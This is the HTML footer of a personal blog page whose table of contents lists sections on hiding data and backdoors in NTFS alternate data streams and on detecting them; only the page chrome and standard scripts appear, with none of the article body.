+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFNTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81%EF%BC%88ADS%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">什么是NTFS交换数据流（ADS）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">NTFS交换数据流隐藏文件实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E6%9C%AC"><span class="toc-number">2.1.</span> <span class="toc-text">隐藏文本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%EF%BC%88%E6%AD%A4%E6%AE%B5%E6%9D%A5%E8%87%AAFreeBuf%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">隐藏后门（此段来自FreeBuf）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E5%92%8C%E6%B8%85%E9%99%A4NTFS-ADS%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">如何检测和清除NTFS-ADS隐藏的文件</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&text=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&is_video=false&description=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=脑洞大开 - NTFS交换数据流ADS&body=Check out this article: https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&title=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&name=脑洞大开 - NTFS交换数据流ADS&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2017_03_04-%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80_NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&t=脑洞大开 - NTFS交换数据流ADS"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    veritas501
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
